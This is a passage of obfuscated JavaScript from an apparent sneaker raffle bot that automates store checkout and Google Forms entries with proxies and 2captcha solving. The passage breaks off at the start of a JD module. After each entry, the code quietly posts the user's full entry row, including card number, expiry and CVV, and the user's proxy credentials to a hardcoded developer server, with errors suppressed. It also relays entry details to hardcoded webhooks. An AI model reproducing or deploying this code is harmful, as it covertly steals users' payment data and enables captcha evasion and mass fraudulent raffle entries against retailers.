                        await _0x55b687['type']('input[name=\x22lastName\x22]', '' + _0x2e043e[_0x31f5cd]['LastName']), await _0x116d4a(0xc8), await _0x55b687['type']('input[name=\x22instagramUsername\x22]', '' + _0x2e043e[_0x31f5cd]['Follower']), await _0x116d4a(0x4b0), await _0x55b687['click']('button.btn.continue-button__1RtsS'), await _0x116d4a(0x3e8), console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x55b687['select']('select[name=\x22country\x22]', '' + _0x2e043e[_0x31f5cd]['Country']), await _0x116d4a(0x2bc), await _0x55b687['type']('input[name=\x22streetName\x22]', '' + _0x2e043e[_0x31f5cd]['Address1']), await _0x116d4a(0x258), await _0x55b687['type']('input[name=\x22houseNumber\x22]', _0x2e043e[_0x31f5cd]['HouseNumber'] + '\x20' + _0x2e043e[_0x31f5cd]['Address2']), await _0x116d4a(0xc8), await _0x55b687['type']('input[name=\x22postalCode\x22]', '' + _0x2e043e[_0x31f5cd]['Zip']), await _0x116d4a(0x1f4), await _0x55b687['type']('input[name=\x22city\x22]', '' + _0x2e043e[_0x31f5cd]['City']), await _0x116d4a(0x4b0), await _0x55b687['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x116d4a(0x4b0), await _0x55b687['click']('button.btn.continue-button__1RtsS'), await _0x116d4a(0x4b0), console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x55b687['solveRecaptchas'](), console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x116d4a(0xbb8), await _0x55b687['click']('button.btn.continue-button__1RtsS'), await _0x116d4a(0x1388), console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x55b687['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x55b687['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x116d4a(0x4b0), await _0x55b687['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x2e043e[_0x31f5cd]['CardNumber']), await _0x116d4a(0x320), await _0x55b687['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x55b687['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x2e043e[_0x31f5cd]['ExpiryDate']), await _0x116d4a(0x4b0), await _0x55b687['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x55b687['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x2e043e[_0x31f5cd]['CVV']), await _0x116d4a(0x226), await _0x55b687['type']('input[name=\x22holderName\x22]', '' + _0x2e043e[_0x31f5cd]['NameOnCard']), await _0x116d4a(0x226), await _0x55b687['click']('button.adyen-checkout__button'), console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x55b687['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x116d4a(0xbb8);
                        } catch (_0x534682) {
                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x203DS\x20Failed')), _0x167901 = '3DS\x20Error\x20' + _0x534682;
                            var _0x13656b = await _0x2520f4(_0x2e043e[_0x31f5cd], _0x352419, 'dev', !![], _0x167901);
                            _0x1a98e8['errorDEV'] = { 'embeds': [_0x13656b] };
                            _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x1a98e8['errorDEV']);
                            await _0x3c7bbe(_0x802c1e, _0x1a98e8['errorDEV']);
                            continue;
                        }
                        _0x523ce4(_0x2e043e[_0x31f5cd], _0x352419), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x49bec7 = _0x2e043e[_0x31f5cd];
                        try {
                            prxdata = {
                                'username': _0x358285['replace']('#', ''),
                                'module': _0x352419['name'],
                                'entrydata': JSON['stringify'](_0x49bec7),
                                'proxy': '' + _0x9becd4[_0x31f5cd]
                            };
                            var _0x550ac4 = JSON['stringify'](prxdata);
                            let _0x1d6274 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x550ac4, _0x1d6274);
                        } catch (_0x39795d) {
                        }
                        if (_0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '')
                            try {
                                await _0x3c7bbe(_0x51d52a['webhook'], _0x1a98e8['succesDEVMSG']);
                            } catch {
                            }
                        await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x1a98e8['succesDEVMSG']), await _0x116d4a(0xc8);
                        try {
                            await _0x3c7bbe(_0x55a106, _0x1a98e8['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x24252e) {
                        console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20' + _0x24252e), _0x167901 = '' + _0x24252e;
                        var _0x13656b = await _0x2520f4(_0x2e043e[_0x31f5cd], _0x352419, 'dev', !![], _0x167901);
                        _0x1a98e8['errorDEV'] = { 'embeds': [_0x13656b] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x1a98e8['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x1a98e8['errorDEV']), _0x3944a6 = 'yes';
                    } finally {
                        _0x2ba9db['close']();
                        if (_0x3944a6 == 'yes' && _0x287ba4 != 0x5) {
                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Retrying\x20(' + _0x287ba4 + '\x20/\x205)')), _0x31f5cd = _0x31f5cd - 0x1, _0x287ba4 = _0x287ba4 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0x1515af, _0x235caf, _0x6d93ab) {
                let _0x39d064 = {
                    'FirstName': '',
                    'LastName': '',
                    'Email': '',
                    'Country': '',
                    'Address': '',
                    'City': '',
                    'Zip': '',
                    'Size': '',
                    'Phone': ''
                }, _0x4a9b52 = 0x0, _0x2ac127 = 0x0;
                function _0x5a3161(_0xa8c61c) {
                    console['log'](_0x3982db() + '\x20[' + _0x1515af['name'] + ']\x20Task\x20' + (_0x487d6e + 0x1) + '\x20:\x20' + _0xa8c61c);
                }
                _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x51d52a['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x487d6e = 0x0; _0x487d6e < _0x235caf['length']; _0x487d6e++) {
                    var _0x4531e0;
                    if (_0x52cdd5 != 'yes') {
                        if (!_0x52cdd5)
                            var _0x52cdd5 = '';
                        else
                            _0x52cdd5 = '';
                        var _0x5bbf3b = 0x0;
                    }
                    try {
                        await _0x2c2316(_0x235caf, _0x487d6e);
                    } catch {
                        _0x52cdd5 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x235caf[_0x487d6e]['Email'] == '' || _0x235caf[_0x487d6e]['FirstName'] == '' || _0x235caf[_0x487d6e]['LastName'] == '' || _0x235caf[_0x487d6e]['Country'] == '' || _0x235caf[_0x487d6e]['Size'] == '' || _0x235caf[_0x487d6e]['Address1'] == '' || _0x235caf[_0x487d6e]['Zip'] == '') {
                        console['log'](_0x3982db() + '\x20[' + _0x1515af['name'] + ']\x20Task\x20' + (_0x487d6e + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x51d52a['useRandomProxy'] = ![])
                        var _0x668d2c = _0x6d93ab[_0x487d6e]['split'](':');
                    else
                        var _0x2fb25d = Math['round'](Math['random']() * (_0x6d93ab['length'] - 0x1)), _0x668d2c = _0x6d93ab[_0x2fb25d]['split'](':');
                    var _0x41d433;
                    if (_0x668d2c['length'] == 0x1)
                        try {
                            _0x41d433 = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x41d433 = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    else
                        try {
                            _0x41d433 = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x668d2c[0x0] + ':' + _0x668d2c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x41d433 = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x668d2c[0x0] + ':' + _0x668d2c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    try {
                        let _0x5b45d4 = { 'first': ![] };
                        const _0x17b498 = await _0x41d433['newPage']();
                        if (_0x668d2c['length'] != 0x0)
                            await _0x17b498['authenticate']({
                                'username': '' + _0x668d2c[0x2],
                                'password': '' + _0x668d2c[0x3]
                            });
                        await _0x17b498['setExtraHTTPHeaders']({ 'Accept-Language': 'en-US' }), _0x5a3161('Getting\x20Session'), await _0x17b498['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x17b498['setRequestInterception'](!![]), _0x17b498['on']('request', _0x44241b => {
                            _0x44241b['resourceType']() === 'image' || _0x44241b['resourceType']() === 'font' || _0x44241b['resourceType']() === 'media' ? _0x44241b['abort']() : _0x44241b['continue']();
                        });
                        try {
                            await _0x17b498['goto'](_0x235caf[_0x487d6e]['Url'], { 'waitUntil': 'networkidle0' }), await _0x116d4a(0xbb8), await _0x17b498['waitForSelector']('.teQAzf');
                        } catch (_0xf24db5) {
                            throw new Error(_0xf24db5);
                        }
                        let _0x3536d7 = await _0x17b498['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                        for (question of _0x3536d7) {
                            let _0x2c73ac = await question['$eval']('.M7eMe', _0x3ecebd => _0x3ecebd['textContent']);
                            if (_0x4a9b52 != 0x0) {
                                let _0x651cfd = ![];
                                for (let _0x530ea6 = 0x0; _0x530ea6 < _0x4a9b52; _0x530ea6++) {
                                    if (_0x2c73ac == _0x39d064['custom' + _0x530ea6]['title']) {
                                        _0x5a3161('Custom\x20Selector\x20found;\x20' + _0x2c73ac);
                                        let _0xbb73f5 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x47fca0 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                        if (_0xbb73f5)
                                            await _0xbb73f5['type']('' + _0x39d064['custom' + _0x530ea6]['answer']);
                                        else
                                            _0x47fca0 && await _0x47fca0['type']('' + _0x39d064['custom' + _0x530ea6]['answer']);
                                        _0x651cfd = !![];
                                        break;
                                    }
                                }
                                if (_0x651cfd) {
                                    await _0x116d4a(0x15e);
                                    continue;
                                }
                            }
                            try {
                                if (_0x2c73ac == _0x39d064['0Select']['title']) {
                                    _0x5a3161('Custom\x20Selector\x20found;\x20' + _0x39d064['0Select']['title']);
                                    let _0x3531cd = await question['$$']('.ulDsOb'), _0x1dee7f = await _0x3531cd[_0x39d064['0Select']['answer']];
                                    await _0x1dee7f['click']();
                                    continue;
                                }
                                if (_0x2c73ac == _0x39d064['1Select']['title']) {
                                    _0x5a3161('Custom\x20Selector\x20found;\x20' + _0x39d064['1Select']['title']);
                                    let _0x342e1b = await question['$$']('.ulDsOb'), _0x47c631 = await _0x342e1b[_0x39d064['1Select']['answer']];
                                    await _0x47c631['click']();
                                    continue;
                                }
                                if (_0x2c73ac == _0x39d064['2Select']['title']) {
                                    _0x5a3161('Custom\x20Selector\x20found;\x20' + _0x39d064['2Select']['title']);
                                    let _0x26519c = await question['$$']('.ulDsOb'), _0x48786f = await _0x26519c[_0x39d064['2Select']['answer']];
                                    await _0x48786f['click']();
                                    continue;
                                }
                            } catch (_0x5797ec) {
                            }
                            if (_0x2c73ac['toLowerCase']()['includes']('mail') && !_0x2c73ac['toLowerCase']()['includes']('agree') || _0x2c73ac == _0x39d064['Email']) {
                                _0x5a3161('Mail\x20Selector\x20found;\x20' + _0x2c73ac);
                                let _0x46abef = await question['$']('input');
                                !_0x46abef && (_0x46abef = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
                                await _0x46abef['type'](_0x235caf[_0x487d6e]['Email']), await _0x116d4a(0x258);
                                continue;
                            }
                            if (_0x2c73ac['toLowerCase']()['includes']('first') || _0x2c73ac['toLowerCase']() == 'name' || _0x2c73ac['toLowerCase']() == 'name\x20' || _0x2c73ac == _0x39d064['FirstName']) {
                                _0x5a3161('FirstName\x20Selector\x20found;\x20' + _0x2c73ac);
                                let _0xfcb411 = await question['$']('input');
                                !_0xfcb411 && (_0xfcb411 = await question['$']('textarea'));
                                await _0xfcb411['type'](_0x235caf[_0x487d6e]['FirstName'] + '\x20'), await _0x116d4a(0x258);
                                if (_0x2c73ac == _0x39d064['FirstName'])
                                    continue;
                            }
                            if (_0x2c73ac['toLowerCase']()['includes']('last') || _0x2c73ac['toLowerCase']()['includes']('surname') || _0x2c73ac == _0x39d064['LastName']) {
                                _0x5a3161('LastName\x20Selector\x20found;\x20' + _0x2c73ac);
                                let _0x23e45c = await question['$']('input');
                                !_0x23e45c && (_0x23e45c = await question['$']('textarea'));
                                await _0x23e45c['type'](_0x235caf[_0x487d6e]['LastName'] + '\x20'), await _0x116d4a(0x258);
                                continue;
                            }
                            if (_0x2c73ac['toLowerCase']()['includes']('address') && !_0x2c73ac['toLowerCase']()['includes']('agree') || _0x2c73ac == _0x39d064['Address']) {
                                _0x5a3161('Address\x20Selector\x20found;\x20' + _0x2c73ac);
                                let _0x3821a9 = await question['$']('input');
                                !_0x3821a9 && (_0x3821a9 = await question['$']('textarea'));
                                await _0x3821a9['type'](_0x235caf[_0x487d6e]['Address1'] + '\x20' + _0x235caf[_0x487d6e]['HouseNumber'] + '\x20' + _0x235caf[_0x487d6e]['Address2']), await _0x116d4a(0x258);
                                continue;
                            }
                            if (_0x2c73ac['toLowerCase']()['includes']('phone') || _0x2c73ac['toLowerCase']()['includes']('mobile') || _0x2c73ac == _0x39d064['Phone']) {
                                _0x5a3161('Phone\x20Selector\x20found;\x20' + _0x2c73ac);
                                let _0x2f157a = await question['$']('input');
                                !_0x2f157a && (_0x2f157a = await question['$']('textarea'));
                                await _0x2f157a['type']('' + _0x235caf[_0x487d6e]['Phone']), await _0x116d4a(0x258);
                                continue;
                            }
                            if (_0x2c73ac['toLowerCase']()['includes']('country') || _0x2c73ac == _0x39d064['Country']) {
                                let _0x3bee61 = await question['$']('div[jsname=\x22wCJL8\x22]');
                                if (_0x3bee61) {
                                    let _0x478c06 = ![], _0x5686a4 = await _0x3bee61['$$']('.ulDsOb');
                                    for (option of _0x5686a4) {
                                        let _0x1e75ce = await option['$']('span'), _0x8ea636 = await option['$eval']('span', _0x910ead => _0x910ead['textContent']);
                                        if (_0x8ea636['toLowerCase']() == _0x235caf[_0x487d6e]['Country']['toLowerCase']()) {
                                            await _0x1e75ce['click'](), _0x478c06 = !![];
                                            break;
                                        }
                                    }
                                    if (!_0x478c06) {
                                        const _0x13e698 = await question['$']('.Hvn9fb.zHQkBf');
                                        await _0x13e698['click'](), await _0x13e698['type'](_0x235caf[_0x487d6e]['Country']);
                                    }
                                    continue;
                                }
                                _0x5a3161('Country\x20Selector\x20found;\x20' + _0x2c73ac);
                                let _0x25be4d = await question['$']('input');
                                !_0x25be4d && (_0x25be4d = await question['$']('textarea'));
                                await _0x25be4d['type']('' + _0x235caf[_0x487d6e]['Country']), await _0x116d4a(0x258);
                                continue;
                            }
                            if (_0x2c73ac['toLowerCase']()['includes']('city') || _0x2c73ac == _0x39d064['City']) {
                                _0x5a3161('City\x20Selector\x20found;\x20' + _0x2c73ac);
                                let _0x4e3606 = await question['$']('input');
                                !_0x4e3606 && (_0x4e3606 = await question['$']('textarea'));
                                await _0x4e3606['type']('' + _0x235caf[_0x487d6e]['City']), await _0x116d4a(0x258);
                                continue;
                            }
                            if (_0x2c73ac['toLowerCase']()['includes']('zip') || _0x2c73ac == _0x39d064['Zip']) {
                                _0x5a3161('Zip\x20Selector\x20found;\x20' + _0x2c73ac);
                                let _0x5ba5a3 = await question['$']('input');
                                !_0x5ba5a3 && (_0x5ba5a3 = await question['$']('textarea'));
                                await _0x5ba5a3['type']('' + _0x235caf[_0x487d6e]['Zip']), await _0x116d4a(0x258);
                                continue;
                            }
                            if (_0x2c73ac['toLowerCase']()['includes']('insta') || _0x2c73ac == _0x39d064['Follower']) {
                                _0x5a3161('Follower\x20Selector\x20found;\x20' + _0x2c73ac);
                                let _0x468fba = await question['$']('input');
                                !_0x468fba && (_0x468fba = await question['$']('textarea'));
                                await _0x468fba['type']('' + _0x235caf[_0x487d6e]['Follower']), await _0x116d4a(0x258);
                                continue;
                            }
                            if (_0x2c73ac['toLowerCase']()['includes']('size') || _0x2c73ac == _0x39d064['Size']) {
                                _0x5a3161('Size\x20Selector\x20found;\x20' + _0x2c73ac);
                                let _0x1bed42 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                if (_0x1bed42) {
                                    let _0x2ae579 = await _0x1bed42['$$']('.ulDsOb');
                                    if (_0x235caf[_0x487d6e]['Size']['toLowerCase']() == 'random') {
                                        var _0x3ca9cd = Math['round'](Math['random']() * (_0x2ae579['length'] - 0x1));
                                        await _0x2ae579[_0x3ca9cd]['click']();
                                    } else
                                        for (size of _0x2ae579) {
                                            let _0x26dce7 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x37122e => _0x37122e['textContent']);
                                            if (_0x26dce7['toLowerCase']()['includes'](_0x235caf[_0x487d6e]['Size'])) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                }
                                let _0x5752ca = await question['$']('.ry3kXd');
                                if (_0x5752ca) {
                                    await _0x5752ca['click'](), await _0x116d4a(0x9c4);
                                    let _0xc28a93 = await _0x17b498['$']('div[jsname=\x22V68bde\x22]'), _0x303654 = await _0xc28a93['$$']('div[jsname=\x22wQNmvb\x22]');
                                    for (size of _0x303654) {
                                        let _0x3c0f75 = await size['$eval']('.vRMGwf.oJeWuf', _0x334cdc => _0x334cdc['textContent']), _0x2c6342 = await size['$']('.vRMGwf.oJeWuf');
                                        if (_0x3c0f75['toLowerCase']()['includes'](_0x235caf[_0x487d6e]['Size'])) {
                                            await _0x116d4a(0x190), await _0x2c6342['click']();
                                            break;
                                        }
                                    }
                                }
                                await _0x116d4a(0x258);
                                continue;
                            }
                            if (_0x2c73ac['toLowerCase']()['includes']('receive') || _0x2c73ac['toLowerCase']()['includes']('method')) {
                                _0x5a3161('Method\x20Selector\x20found;\x20' + _0x2c73ac);
                                let _0x2bba22 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                if (_0x2bba22) {
                                    const _0x941b93 = await _0x2bba22['$$']('.ulDsOb');
                                    for (size of _0x941b93) {
                                        let _0x5aaad5 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x3b0473 => _0x3b0473['textContent']);
                                        if (_0x5aaad5['toLowerCase']()['includes']('shipping')) {
                                            await size['click']();
                                            break;
                                        }
                                    }
                                }
                                await _0x116d4a(0x258);
                                continue;
                            }
                            if (_0x2c73ac['toLowerCase']()['includes']('offers') || _0x2c73ac['toLowerCase']()['includes']('agree')) {
                                _0x5a3161('Authorization\x20Selector\x20found;\x20' + _0x2c73ac);
                                const _0x3af88f = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                if (_0x3af88f) {
                                    const _0x12f5fe = await _0x3af88f['$$']('.ulDsOb');
                                    for (size of _0x12f5fe) {
                                        let _0x4845b0 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x342781 => _0x342781['textContent']);
                                        if (_0x4845b0['toLowerCase']()['includes']('authorize') || _0x4845b0['toLowerCase']()['includes']('yes')) {
                                            await size['click']();
                                            break;
                                        }
                                    }
                                }
                                await _0x116d4a(0x258);
                                continue;
                            }
                            async function _0x505a5d() {
                                let _0xd23855 = await question['$']('.oyXaNc');
                                if (_0xd23855) {
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x1403a4['cyan'](_0x2c73ac) + '\x0a');
                                    let _0x40271b = await question['$$']('.ulDsOb');
                                    for (let _0x3a0bfd = 0x0; _0x3a0bfd < _0x40271b['length']; _0x3a0bfd++) {
                                        let _0x27dc90 = await _0x40271b[_0x3a0bfd]['$eval']('span', _0x27f2ca => _0x27f2ca['textContent']);
                                        console['log']('\x20(' + _0x3a0bfd + ')\x20' + _0x27dc90);
                                    }
                                    console['log']();
                                    let _0x3667a1 = await _0xab4dc6['get']('option'), _0x1a22c5 = await _0x40271b[_0x3667a1['option']]['$eval']('span', _0x3ad775 => _0x3ad775['textContent']);
                                    _0x39d064[_0x2ac127 + 'Select'] = {
                                        'title': _0x2c73ac,
                                        'answer': _0x3667a1['option']
                                    };
                                    let _0x5a79cb = await _0x40271b[_0x3667a1['option']]['$']('span');
                                    await _0x5a79cb['click'](), _0x2ac127++;
                                    return;
                                }
                                let _0x2988f0 = await question['$']('.Y6Myld');
                                if (_0x2988f0) {
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x1403a4['cyan'](_0x2c73ac) + '\x0a');
                                    let _0x40a4a2 = await question['$$']('.ulDsOb');
                                    for (let _0x20b98a = 0x0; _0x20b98a < _0x40a4a2['length']; _0x20b98a++) {
                                        let _0x5c3838 = await _0x40a4a2[_0x20b98a]['$eval']('span', _0xa6d01b => _0xa6d01b['textContent']);
                                        console['log']('\x20(' + _0x20b98a + ')\x20' + _0x5c3838);
                                    }
                                    console['log']();
                                    let _0x36211e = await _0xab4dc6['get']('option');
                                    _0x39d064[_0x2ac127 + 'Select'] = {
                                        'title': _0x2c73ac,
                                        'answer': _0x36211e['option']['split'](',')
                                    };
                                    for (opt of _0x39d064[_0x2ac127 + 'Select']['answer']) {
                                        let _0x121bbd = await _0x40a4a2[opt]['$']('span');
                                        await _0x121bbd['click']();
                                    }
                                    _0x2ac127++;
                                    return;
                                }
                                var _0x51afad = 0x0;
                                let _0x44fedd = Object['keys'](_0x39d064);
                                console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x1403a4['cyan'](_0x2c73ac) + '\x0a');
                                for (data of _0x44fedd) {
                                    !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0x51afad + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0x51afad + ')\x20' + data), _0x51afad++;
                                }
                                console['log']('\x20(' + _0x44fedd['length'] + ')\x20Custom\x20input:'), console['log']();
                                let _0x2d374b = await _0xab4dc6['get']('input');
                                if (_0x2d374b['input'] == _0x44fedd['length']) {
                                    console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
                                    let _0x4cfa33 = await _0xab4dc6['get']('input');
                                    _0x39d064['custom' + _0x4a9b52] = {
                                        'title': _0x2c73ac,
                                        'answer': _0x4cfa33['input']
                                    };
                                    let _0x346f34 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x1a09f4 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                    if (_0x346f34)
                                        await _0x346f34['type']('' + _0x39d064['custom' + _0x4a9b52]['answer']);
                                    else
                                        _0x1a09f4 && await _0x1a09f4['type']('' + _0x39d064['custom' + _0x4a9b52]['answer']);
                                    _0x4a9b52++;
                                    return;
                                }
                                _0x39d064['' + _0x44fedd[_0x2d374b['input']]] = _0x2c73ac;
                                let _0x55c1e7 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x14f79f = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                _0x55c1e7 && await _0x55c1e7['type']('' + _0x235caf[_0x487d6e]['' + _0x44fedd[_0x2d374b['input']]]), _0x14f79f && await _0x14f79f['type']('' + _0x235caf[_0x487d6e]['' + _0x44fedd[_0x2d374b['input']]]), await _0x116d4a(0x258);
                            }
                            await _0x505a5d(), await _0x116d4a(0x37a);
                        }
                        await _0x17b498['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x17b498['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0x523ce4(_0x235caf[_0x487d6e], _0x1515af), _0x52cdd5 = 'no';
                        var _0x19bab6 = await _0x2520f4(_0x235caf[_0x487d6e], _0x1515af, 'dev', ![]), _0x3dbee2 = await _0x2520f4(_0x235caf[_0x487d6e], _0x1515af, 'pub', ![]);
                        let _0x29bf23 = _0x235caf[_0x487d6e];
                        try {
                            prxdata = {
                                'username': _0x358285['replace']('#', ''),
                                'module': _0x1515af['name'],
                                'entrydata': JSON['stringify'](_0x29bf23),
                                'proxy': '' + _0x6d93ab[_0x487d6e]
                            };
                            var _0x38901d = JSON['stringify'](prxdata);
                            let _0x3bb2a8 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x38901d, _0x3bb2a8);
                        } catch (_0x585671) {
                        }
                        const _0x261f3e = {
                            'succesDEVMSG': { 'embeds': [_0x19bab6] },
                            'succesPUBMSG': { 'embeds': [_0x3dbee2] }
                        };
                        try {
                            _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x261f3e['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x261f3e['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x55a106, _0x261f3e['succesPUBMSG']);
                        } catch (_0x345114) {
                            console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x487d6e + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x345114));
                        }
                        console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x1515af['name'] + ']\x20Task\x20' + (_0x487d6e + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                    } catch (_0x184980) {
                        console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1515af['name'] + ']\x20Task\x20' + (_0x487d6e + 0x1) + '\x20:\x20' + _0x184980)), _0x4531e0 = '' + _0x184980;
                        var _0x2bf963 = await _0x2520f4(_0x235caf[_0x487d6e], _0x1515af, 'dev', !![], _0x4531e0);
                        let _0xa7b09c = {};
                        _0xa7b09c['errorDEV'] = { 'embeds': [_0x2bf963] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0xa7b09c['errorDEV']), await _0x3c7bbe(_0x802c1e, _0xa7b09c['errorDEV']), _0x52cdd5 = 'yes';
                    } finally {
                        _0x41d433 && _0x41d433['close']();
                        if (_0x52cdd5 == 'yes' && _0x5bbf3b != 0x5) {
                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1515af['name'] + ']\x20Task\x20' + (_0x487d6e + 0x1) + '\x20:\x20Retrying\x20(' + _0x5bbf3b + '\x20/\x205)')), _0x487d6e = _0x487d6e - 0x1, _0x5bbf3b = _0x5bbf3b + 0x1;
                            continue;
                        }
                        if (_0x52cdd5 == 'yes' && _0x5bbf3b == 0x5) {
                            _0x5bbf3b = 0x0, _0x52cdd5 = 'no';
                            continue;
                        }
                        _0x5a3161('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0xf2c6b, _0x3a220d, _0x5276e5) {
                var _0x128e3f = ![], _0x3bb2e2 = ![];
                if (_0x51d52a['captchaKey'] == '' || _0x51d52a['captchaKey'] == undefined)
